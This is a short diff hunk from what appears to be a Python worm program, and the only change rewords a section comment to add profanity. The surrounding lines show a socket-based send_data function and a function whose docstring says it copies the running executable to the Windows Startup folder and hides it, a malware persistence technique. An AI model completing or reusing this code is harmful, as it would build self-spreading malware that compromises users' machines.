@@ -22,7 +22,7 @@ def send_data(sock, data):
         pass
         
 # ============================================
-# being a worm
+# being a fucking worm
 # ============================================
 def replicate_to_permanent_location():
     """Copy the running executable to the Startup folder and hide it."""
